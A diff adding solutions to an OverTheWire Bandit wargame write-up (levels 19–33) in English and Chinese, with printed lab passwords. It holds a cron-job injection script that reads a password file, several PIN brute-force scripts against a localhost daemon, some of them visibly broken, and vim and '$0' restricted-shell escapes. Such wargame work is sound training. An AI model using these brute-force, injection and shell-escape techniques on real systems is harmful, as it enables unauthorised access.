@@ -1,8 +1,21 @@
 # overthewire_bandit
 
+2/17/2020 updated.
+Lo termino todo~ estos son solución, pienses que si quiere verlo.
+
+
+休息一下~休息一下~
+￣￣￣￣￣＼／￣￣￣￣
+　　　　∧＿∧　　　　
+　　;;（´・ω・） 　
+　＿旦_(っ (,,■)＿＿
+　|l￣l||￣しﾞしﾞ￣|i
+
+
 [toc]
 
-# `bandit0@bandit.labs.overthewire.org -p 2220`
+`bandit0@bandit.labs.overthewire.org -p 2220`
+
 
 # Solutions
 
@@ -717,8 +730,8 @@ uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit
 1-99 are reserved for other predefined accounts
 100-999 are reserved for other system account and groups.
 # gid is group id
-
 # euid is an effective user id. This is the one that is used when the system checks whether the user in question has sufficient permissions.
+
 # the file that has the next password will only have read permission for bandit20 user, but let’s see.
 bandit19@bandit:~$ cat /etc/bandit_pass/bandit20
 cat: /etc/bandit_pass/bandit20: Permission denied
@@ -909,11 +922,15 @@ What does this mean to us?
 
 ```py
 # go ahead and create a temporary directory.
+
+# bandit23@bandit:/var/spool/bandit24$ vim getpass
+# bandit23@bandit:/var/spool/bandit24$ chmod 777 getpass
+
 bandit23@bandit:/etc/cron.d$ mkdir /tmp/grace44
 bandit23@bandit:/etc/cron.d$ cd /tmp/grace44
 bandit23@bandit:/tmp/grace44$ nano
 
-# open Nano we will go ahead and write our own script to inject.
+# open Nano we will go ahead and write script to inject:
 
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass      
@@ -939,7 +956,7 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 ---
 
-## Bandit Level 24 → Level 25
+## Bandit Level 24 → Level 25 `nc localhost port password pin`
 Level Goal
 - A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, `brute-force`.
 
@@ -951,22 +968,76 @@ list of general steps for this challenge/script.
   - Send a password + pin combo (Script and `automate this process`)
   - Evaluate the results
 
+1. go ahead and write a `Bash Script` to Brute Force the PIN while attempting a connection.
+
+`echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1001 | nc localhost 30002 >> result &`
+
+```py
+-----------------------------------------------------
+#!/bin/bash
+password24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for i in {0000..9999}
+  do
+    echo $password24 $i >> passlist.txt
+  done
+# generated the passlist.txt with the password and 0000 for example:
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+...
+# cat this file into nc and let it run
+cat passlist.txt | nc localhost 30002
+-----------------------------------------------------
+#!/bin/bash
+passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+for a in {0000-10000};
+  do
+    echo $passwd' ''$a | nc localhost 30002 >> result &
+  done
+# put in result and search
+# but actullay it cannot loop
+# need troubleshoott
+bandit24@melinda:/tmp/jhalon$ chmod 755 script.sh
+bandit24@melinda:/tmp/jhalon$ ./script.sh
+bandit24@melinda:/tmp/jhalon$ sort result | uniq -u
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+
+
+2.
 ```py
 import socket
 
 pin = 0
 password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
- s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect(('localhost', 30002))
- s.rev(1024)
- while true:
-   print ' [+] Sending Pin: ' + str(pin)
-   s.sendall(password + str(pin)+'\n')
-   data=s.recv(1024)
-   print data2pin +=1
-   
-```
 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 30002))
+s.recv(1024)
+
+while True:
+#  print ' [Heart] Sending Pin: ' + str(pin)
+  s.sendall(password+' '+str(pin)+'\n')
+  data=s.recv(1024)
+#  print data
+
+  if "Fail" in data:
+     print data
+     exit(0)
+  elif "Wrong" in data:
+     print "wrong Pincode: " + str(pin)
+  else:
+     print "Got Pincode: " + str(pin)
+     print data
+     exit(0)
+  pin +=1
+
+# results
+[+] Sending Pin: 3710
+[+] Sending Pin: 3711
+```
 
 - First import the socket library, socket is required to make network connections.
 - Then initialize the `pin` variable with a 0 and set my `password` variable.
@@ -986,11 +1057,521 @@ password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
 Note: It’s been pointed out that my while loop is an infinity loop. I know, I could have just used a for loop and that’s a better method of doing it. I was planning on putting in error handling + conditionals but it wasn’t necessary.
 
 
+3.
+根据python的pwntools写个脚本跑密码就好了
+- 在其他目录下没有写权限，这个脚本只能在/tmp目录下创建。
+- 如果用的是我下面这种receive line方法，有些破坏输出的结果我要多接收一行过滤掉，
+
+```py
+$ nano /tmp/conn.py
+
+#！ /usr/bin/python
+from pwn import *
+
+conn = remote('localhost', '30002')
+badline = conn.recvline()
+for i in range(1000):
+    tmp = str(i).zfill(4)
+    print '[+] Trying pincode: ' + str(tmp)
+    conn.sendline('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + tmp)
+    response = conn.recvline()
+    print response
+
+    if "Wrong" not in response:
+       print "Got Pincode: " + str(tmp)
+       response = conn.recvline()
+       print response
+       exit(0)
+
+# 终端运行
+python /tmp/conn.py
+...
+[+] Trying pincode: 0377
+Wrong! Please enter the correct pincode. Try again.
+[+] Trying pincode: 0378
+Correct!
+Got Pincode: 0378
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+```
+
+4.
+```py
+#!/usr/bin/python
+from pwn import *
+from multiprocessing import Process
+
+def brute(nrOne,nrTwo):
+    for pin in range(nrOne,nrTwo):
+        pin = str(pin).zfill(4)
+
+        r = remote('localhost', 30002)
+        r.recv()
+        r.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pin + '\n')
+
+        if 'Wrong' not in r.recvline():
+            print '[+] Successful -> ' + pin
+            print r.recvline()
+            r.close()
+        else:
+            if int(pin) % 100 == 0:
+                print '[!] Failed -> ' + pin
+            r.close()
+
+if __name__=='__main__':
+    p1 = Process(target = brute, args = (0,2500,))
+    p2 = Process(target = brute, args = (2500,5000,))
+    p3 = Process(target = brute, args = (5000,7500,))
+    p4 = Process(target = brute, args = (7500,10000,))
+    p1.start()
+    p2.start()
+    p3.start()
+    p4.start()
+```
+
+started the brute function four times and assigned a pincode range to each process to speed up the task. After a short time the password for the next level appears.
+- `SILENT=1` disables the `pwntools` output that appears every time a connection is established or closed.
+
+---
+
+## Bandit Level 25 → Level 26 `in move window use v to enter vim, :e /etc/bandit_pass/bandit26`
+Level Goal
+- Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.
+
+```py
+# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+# 家目录上面有一个bandit26.sshkey,
+bandit25@bandit:~$ ls
+bandit26.sshkeyhkey
+
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+Could not create directory '/home/bandit25/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? n
+Please type 'yes' or 'no': no
+Host key verification failed.
+bandit25@bandit:~$
+
+# 用这个私钥文件去连接远程的主机, ssh -i bandit26.sshkey bandit26@localhost
+# 发现连接直接被远程关闭了，加上-T 参数也没有用
+
+# 题目也提示说这个用的是其他shell
+bandit25@melinda:~$ ls -a
+.   .bandit24.password  .bashrc  .profile
+..  .bash_logout        .pin     bandit26.sshkey
+
+# 查看其某用户用的什么shell 可以查看/etc/passwd。
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+# bandit26用户用到的shell就是/usr/bin/showtext
+
+$ cat /usr/bin/showtext
+#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+
+# 系统关闭连接的原因是这个exit 0
+# 在这个exit 之前执行想要的命令
+The more command is used to open the file text.txt.
+more is useful to display long (text) files on small screens or in a size limited terminal window - similar to the less command, but with much fewer functions.
+resize the currently terminal window to so small to enter the more environment.
+# 在 more 命令执行之前可以执行命令即可，把会话的终端缩小，
+# 用 ssh -i bandit26.sshkey bandit26@localhost > yes，自动more
+# 在 more 命令还没有结束的时候按v进入vim编辑模式。
+
+进入vim编辑模式。
+
+1. :e /etc/bandit_pass/bandit26     # 导入文件到编辑器内，
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+2. :r /etc/bandit_pass/bandit26     # 读入另一个档案的数据
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+2. start a shell.
+- Type in :set shell=/bin/bash
+- and type in :shell
+- This will spawn a bash shell and allow us to get the password for this level.
+
+:shell
+[No write since last change]
+bandit26@bandit:~$
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+`bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext`
+- passwd文件格式:
+  - 账号名称：即登陆时的用户名
+  - 密码：早期UNIX系统的密码是放在这个文件中的，但因为这个文件的特性是所有程序都能够读取，所以，这样很容易造成数据被窃取，因此后来就将这个字段的密码数据改放到/etc/shadow中了
+  - UID：用户ID，每个账号名称对应一个UID，通常UID=0表示root管理员
+  - GID：组ID，与/etc/group有关，/etc/group与/etc/passwd差不多，是用来规范用户组信息的
+  - 用户信息说明栏： 用来解释这个账号是干什么的
+  - 家目录：home目录，即用户登陆以后跳转到的目录，以root用户为例，/root是它的家目录，所以root用户登陆以后就跳转到/root目录这里
+  - Shell：用户使用的shell，通常使用/bin/bash这个shell，这也就是为什么登陆Linux时默认的shell是bash的原因，就是在这里设置的，如果要想更改登陆后使用的shell，可以在这里修改。另外一个很重要的东西是有一个shell可以用来替代让账号无法登陆的命令，那就是/sbin/nologin。
+
+---
+
+## Bandit Level 26 → Level 27 `:set shell=/bin/bash, :shell`
+Level Goal
+- Good job getting a shell! Now hurry and grab the password for bandit27!
+
+使用密码ssh登陆之后也是直接断开了，跟上一关一样
+- 进入more模式，
+- 利用vim模式执行命令，
+- 不能用:e来读取文件bandit27-do，因为权限不够。
+- !command也不行，!sh也不行，
+
+vim还有一种需要先设置shell的目录才行
+2. start a shell.
+- Type in `:set shell=/bin/bash`
+- and type in `:shell`
+- This will spawn a bash shell and allow us to get the password for this level.
+
+:shell
+[No write since last change]
+bandit26@bandit:~$
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 
 
+```py
+# 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+
+bandit26@bandit:~$ ./bandit27-do id
+uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+# bandit27 can open This
+
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
+cat: /etc/bandit_pass/bandit27: Permission denied
+
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+---
+
+## Bandit Level 27 → Level 28  `git clone ssh:url`
+Level Goal
+- There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
+
+Clone the repository and find the password for the next level.
+
+这题是主要是克隆项目的命令，直接在当前目录是新建不了新文件的，所以我们在临时目录下创建目录即可，具体步骤如下，发现这个项目的里面的README就是存储的的密钥
 
 
+```py
+bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+fatal: could not create work tree dir 'repo': Permission denied
 
+bandit27@bandit:~$ mkdir /tmp/grace66
+bandit27@bandit:~$ cd /tmp/grace66
+
+bandit27@bandit:/tmp/grace66$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repoCloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' cant be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27-git@localhosts password: # 3ba3118a22e93127a4ed485be72ef5ea
+remote: Counting objects: 3, done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (3/3), done.
+
+bandit27@bandit:/tmp/grace66$ ls
+repo
+bandit27@bandit:/tmp/grace66$ ls -la
+...
+drwxr-sr-x 3 bandit27 root      4096 Feb 17 20:11 repo
+
+bandit27@bandit:/tmp/grace66$ cd repo
+bandit27@bandit:/tmp/grace66/repo$ ls -la
+...
+-rw-r--r-- 1 bandit27 root   68 Feb 17 20:11 README
+
+bandit27@bandit:/tmp/grace66/repo$ cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+---
+
+## Bandit Level 28 → Level 29 `git log, git diff logNum1 logNum2`
+Level Goal
+There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.
+
+Clone the repository and find the password for the next level.
+
+
+```py
+# 0ef186ac70e04ea33b4c1853d2526fa2
+
+bandit28@bandit:~$ mkdir /tmp/grace88
+bandit28@bandit:~$ cd /tmp/grace88
+bandit28@bandit:/tmp/grace88$
+bandit28@bandit:/tmp/grace88$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repoCloning into 'repo'...
+
+bandit28@bandit:/tmp/grace88$ cd repo
+bandit28@bandit:/tmp/grace88/repo$ ls -la
+...
+-rw-r--r-- 1 bandit28 root  111 Feb 17 20:16 README.md
+
+bandit28@bandit:/tmp/grace88/repo$ cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
+## credentials
+- username: bandit29
+- password: xxxxxxxxxx
+
+# git log查看提交历史，
+$ git log
+commit 073c27c130e6ee407e12faad1dd3848a110c4f95
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    fix info leak
+
+commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    add missing data
+
+commit b67405defc6ef44210c53345fc953e6a21338cc7
+Author: Ben Dover <noone@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    initial commit of README.md
+
+# 然后对应版本提交id, 查找区别，得出密码。
+$ git diff 073c27c130e6ee407e12faad1dd3848a110c4f95 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+diff --git a/README.md b/README.md
+index 5c6457b..3f7cee8 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+ - username: bandit29
+-- password: xxxxxxxxxx
++- password: bbc96594b4e001778eee9975372716b2
+
+$ git diff 186a1038cc54d1358d42d468cdc8e3cc28a93fcb b67405defc6ef44210c53345fc953e6a21338cc7
+diff --git a/README.md b/README.md
+index 3f7cee8..7ba2d2f 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+ - username: bandit29
+-- password: bbc96594b4e001778eee9975372716b2
++- password: <TBD>
+```
+
+---
+
+## Bandit Level 29 → Level 30 `git branch -a, git checkout branchName`
+Level Goal
+- There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.
+- Clone the repository and find the password for the next level.
+
+```py
+# bbc96594b4e001778eee9975372716b2
+
+$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+Cloning into 'repo'...
+bandit29-git@localhosts password: # bbc96594b4e001778eee9975372716b2
+Resolving deltas: 100% (2/2), done.
+
+$ cd repo
+$ git show
+commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8
+...
+-- username: bandit29
++- username: bandit30
+ - password: <no passwords in production!>
+
+$ git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/dev
+  remotes/origin/master
+  remotes/origin/sploits-dev
+
+$ git checkout dev
+Branch dev set up to track remote branch dev from origin.
+Switched to a new branch 'dev'
+
+$ git log
+commit 33ce2e95d9c5d6fb0a40e5ee9a2926903646b4e3  
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:41 2018 +0200
+    add data needed for development      # 最新的版本里面有个data needed for development
+commit a8af722fccd4206fc3780bd3ede35b2c03886d9b
+Author: Ben Dover <noone@overthewire.org>
+Date:   Tue Oct 16 14:00:41 2018 +0200
+    add gif2ascii
+...
+
+$ ls
+code  README.md
+$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+## credentials
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+```
+
+---
+
+## Bandit Level 30 → Level 31 `git show-ref`
+Level Goal
+- There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.
+
+```py
+5b90576bedb2cc04c86a9e924ce42faf
+
+bandit30@bandit:/tmp/grace30/repo$ ls
+README.md
+bandit30@bandit:/tmp/grace30/repo$ cat README.md
+just an epmty file... muahaha
+bandit30@bandit:/tmp/grace30/repo$ git show
+..
+@@ -0,0 +1 @@
++just an epmty file... muahaha
+
+# git show-ref可以现实本地存储库的所有可用的引用以及关联的提交ID
+$ git show-ref
+3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master
+3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD
+3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master
+f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret
+
+$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
+47e603bb428404d265f59c42920d81e5
+```
+
+---
+
+## Bandit Level 31 → Level 32 `git add -f file, git status, git commit '...'/'addfile', git push origin master`
+Level Goal
+- There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.
+
+Clone the repository and find the password for the next level.
+
+
+```py
+# 47e603bb428404d265f59c42920d81e5
+
+bandit31@bandit:~$ cat .gitconfig
+[user]
+	email = bandit31@overthewire.org
+	name = bandit31
+
+
+bandit31@bandit:/tmp/grace31/repo$ cat README.md
+This time your task is to push a file to the remote repository.
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+bandit31@bandit:/tmp/grace31/repo$ echo 'May I come in?' > key.txt
+bandit31@bandit:/tmp/grace31/repo$ ls
+key.txt  README.md
+
+bandit31@bandit:/tmp/grace31/repo$ git add key.txt
+The following paths are ignored by one of your .gitignore files:
+key.txt
+Use -f if you really want to add them.
+bandit31@bandit:/tmp/grace31/repo$ git add -f key.txt
+
+bandit31@bandit:/tmp/grace31/repo$ git status
+On branch master
+Your branch is ahead of 'origin/master' by 3 commits.
+  (use "git push" to publish your local commits)
+Changes to be committed:
+  (use "git reset HEAD <file>..." to unstage)
+
+	new file:   key.txt
+
+
+bandit31@bandit:/tmp/grace31/repo$ git commit -m 'add key2.txt' # the same
+bandit31@bandit:/tmp/grace31/repo$ git commit -m '...'
+[master 71da273] ...
+ 1 file changed, 1 insertion(+)
+ create mode 100644 key.txt
+
+bandit31@bandit:/tmp/grace31/repo$ git push
+bandit31-git@localhosts password:  # 47e603bb428404d265f59c42920d81e5
+Counting objects: 7, done.
+Delta compression using up to 4 threads.
+Compressing objects: 100% (5/5), done.
+Writing objects: 100% (7/7), 678 bytes | 0 bytes/s, done.
+Total 7 (delta 1), reused 0 (delta 0)
+remote: ### Attempting to validate files... ####
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+remote: Well done! Here is the password for the next level:
+remote: 56a9bf19c63d650ce78e6ec0354ee45e
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+remote: fatal: Path 'key.txt' does not exist in '0df0d8d572f99c8d76ee12b9b8c74b6016ba0b31'
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+remote: Wrong!
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+To ssh://localhost/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
+bandit31@bandit:/tmp/grace31/repo$
+```
+
+---
+
+## Bandit Level 32 → Level 33 `$0`
+- After all this git stuff its time for another escape. Good luck!
+
+```py
+# 56a9bf19c63d650ce78e6ec0354ee45e
+
+$0进入正常终端
+
+WELCOME TO THE UPPERCASE SHELL
+>> $0
+$ ls
+uppershell
+$ whoami      # always check who u are first!!!
+bandit33
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+```
+
+---
+
+## Bandit Level 33 → Level 34
+- At this moment, level 34 does not exist yet.
 
 
 
